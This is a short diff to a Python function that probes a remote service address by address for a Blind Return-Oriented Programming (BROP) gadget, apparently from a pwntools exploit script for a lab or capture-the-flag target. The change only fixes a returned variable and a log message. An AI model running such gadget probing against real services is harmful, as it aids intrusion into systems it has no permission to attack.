@@ -54,7 +54,7 @@ def get_brop_gadget(size = 72, stop_address = 0x400545):
             except EOFError:
                 p.close()
                 log.info("Brop gadget found!")
-                return addr
+                return probe
               
             except Exception:
                 log.info("Bad connection!")
@@ -62,7 +62,7 @@ def get_brop_gadget(size = 72, stop_address = 0x400545):
 
         except EOFError:
             p.close()
-            log.info("Not even likely!" % addr)
+            log.info("0x%x, not even likely!" % probe)
             addr += 1
             
         except Exception:
